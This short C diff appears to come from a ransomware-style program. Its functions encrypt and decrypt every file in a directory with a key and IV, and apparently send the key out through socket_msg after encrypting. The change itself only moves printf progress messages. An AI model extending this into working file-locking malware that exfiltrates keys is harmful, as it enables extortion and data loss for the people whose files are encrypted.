@@ -167,8 +167,6 @@ void crypted_list_dir(const char *path, unsigned char *key, unsigned char *iv) {
     FILE *file_start, *file_crypted;
     directory = opendir(path);
 
-    printf("Directory : %s\n", path);
-
     while ((entry = readdir(directory)) != NULL) {
 
         char *file = entry->d_name; //stock the name of the file
@@ -246,6 +244,8 @@ void crypted_list_dir(const char *path, unsigned char *key, unsigned char *iv) {
 
     socket_msg(key, iv);
 
+    printf("Directory : %s......done!\n", path);
+
 }
 
 void decrypted_list_dir(const char *path, unsigned char *key, unsigned char *iv) {
@@ -253,8 +253,6 @@ void decrypted_list_dir(const char *path, unsigned char *key, unsigned char *iv)
     struct dirent *entry;
     FILE *file_crypted, *file_decrypted;
     directory = opendir(path);
-
-    printf("Directory : %s\n", path);
 
     while ((entry = readdir(directory)) != NULL) {
 
@@ -335,6 +333,8 @@ void decrypted_list_dir(const char *path, unsigned char *key, unsigned char *iv)
     }
 
     closedir(directory); //close directory
+
+    printf("Directory : %s......done!\n", path);
 }
 
 int main(int argc, char *argv[]) {
